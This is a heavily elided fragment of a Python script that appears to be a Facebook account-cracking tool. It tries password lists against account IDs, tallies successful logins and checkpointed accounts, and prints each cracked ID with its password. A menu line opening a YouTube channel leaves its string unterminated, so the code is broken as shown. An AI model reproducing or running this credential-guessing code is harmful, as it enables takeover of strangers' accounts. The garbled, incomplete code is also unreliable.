...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/c/https://youtube.com/channel/md Tuhin Ahmed)
		exit()
	else:
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [Tuhin] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [Tuhin-CP] %s|%s        '%(b,idf,pw))
